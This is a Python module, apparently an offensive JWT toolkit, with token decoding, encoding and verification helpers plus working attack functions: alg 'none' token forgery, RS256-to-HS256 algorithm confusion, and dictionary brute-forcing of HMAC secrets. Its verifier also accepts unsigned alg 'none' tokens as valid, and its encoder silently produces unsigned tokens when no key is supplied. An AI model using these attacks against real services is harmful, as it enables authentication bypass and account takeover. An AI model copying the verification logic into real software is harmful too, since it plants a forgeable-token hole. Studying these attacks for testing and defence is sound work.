"""JSON Web Token (JWT) inspection, decoding, verification, and security attacks."""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from typing import Any


def b64url_encode(data: bytes) -> str:
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def b64url_decode(s: str) -> bytes:
    """Base64url decode with padding compensation."""
    rem = len(s) % 4
    if rem:
        s += "=" * (4 - rem)
    return base64.urlsafe_b64decode(s.encode("ascii"))


def jwt_decode(
    token: str, verify: bool = False, key: str | bytes = ""
) -> tuple[dict[str, Any], dict[str, Any], bytes]:
    """Decodes JWT into (header, payload, signature).

    If verify=True, verifies signature for HS256/HS384/HS512 or none.
    """
    parts = token.strip().split(".")
    if len(parts) < 2 or len(parts) > 3:
        raise ValueError("Invalid JWT format: expected 3 dot-separated segments")

    header_bytes = b64url_decode(parts[0])
    payload_bytes = b64url_decode(parts[1])
    sig_bytes = b64url_decode(parts[2]) if len(parts) == 3 and parts[2] else b""

    header = json.loads(header_bytes.decode("utf-8"))
    payload = json.loads(payload_bytes.decode("utf-8"))

    if verify:
        alg = header.get("alg", "").upper()
        signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
        key_bytes = key.encode("utf-8") if isinstance(key, str) else key

        if alg == "NONE":
            if sig_bytes != b"":
                raise ValueError("Signature must be empty when alg=none")
        elif alg == "HS256":
            expected = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
            if not hmac.compare_digest(sig_bytes, expected):
                raise ValueError("Invalid HS256 signature")
        elif alg == "HS384":
            expected = hmac.new(key_bytes, signing_input, hashlib.sha384).digest()
            if not hmac.compare_digest(sig_bytes, expected):
                raise ValueError("Invalid HS384 signature")
        elif alg == "HS512":
            expected = hmac.new(key_bytes, signing_input, hashlib.sha512).digest()
            if not hmac.compare_digest(sig_bytes, expected):
                raise ValueError("Invalid HS512 signature")
        else:
            raise NotImplementedError(f"Verification for algorithm {alg} not supported")

    return header, payload, sig_bytes


def jwt_encode(header: dict[str, Any], payload: dict[str, Any], key: str | bytes = "") -> str:
    """Encodes a JWT with header and payload, signing with HS256 if key provided or none."""
    h_json = json.dumps(header, separators=(",", ":")).encode("utf-8")
    p_json = json.dumps(payload, separators=(",", ":")).encode("utf-8")

    h_b64 = b64url_encode(h_json)
    p_b64 = b64url_encode(p_json)
    signing_input = f"{h_b64}.{p_b64}".encode("ascii")

    alg = header.get("alg", "").upper()
    if alg == "NONE" or not key:
        return f"{h_b64}.{p_b64}."

    key_bytes = key.encode("utf-8") if isinstance(key, str) else key
    if alg == "HS256":
        sig = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
    elif alg == "HS384":
        sig = hmac.new(key_bytes, signing_input, hashlib.sha384).digest()
    elif alg == "HS512":
        sig = hmac.new(key_bytes, signing_input, hashlib.sha512).digest()
    else:
        sig = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()

    return f"{h_b64}.{p_b64}.{b64url_encode(sig)}"


def jwt_attack_none(
    token: str, new_payload: dict[str, Any] | None = None, alg_variant: str = "none"
) -> str:
    """Creates a forged token with alg='none' and optional modified payload."""
    header, payload, _ = jwt_decode(token, verify=False)
    header["alg"] = alg_variant
    if new_payload is not None:
        payload.update(new_payload)

    h_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    p_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    return f"{h_b64}.{p_b64}."


def jwt_attack_alg_confusion(
    token: str,
    public_key_pem: str | bytes,
    new_payload: dict[str, Any] | None = None,
) -> str:
    """Executes the RS256 -> HS256 algorithm confusion attack.

    The public key PEM is used as the HMAC secret key.
    """
    header, payload, _ = jwt_decode(token, verify=False)
    header["alg"] = "HS256"
    if new_payload is not None:
        payload.update(new_payload)

    key_bytes = (
        public_key_pem.encode("utf-8") if isinstance(public_key_pem, str) else public_key_pem
    )
    return jwt_encode(header, payload, key=key_bytes)


def jwt_brute_force_hmac(token: str, wordlist: list[str]) -> str | None:
    """Attempts to recover HMAC secret by dictionary attack."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None

    header, _, sig_bytes = jwt_decode(token, verify=False)
    alg = header.get("alg", "HS256").upper()
    hash_fn = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }.get(alg, hashlib.sha256)

    signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")

    for word in wordlist:
        cand_key = word.strip().encode("utf-8")
        expected = hmac.new(cand_key, signing_input, hash_fn).digest()
        if hmac.compare_digest(sig_bytes, expected):
            return word.strip()

    return None
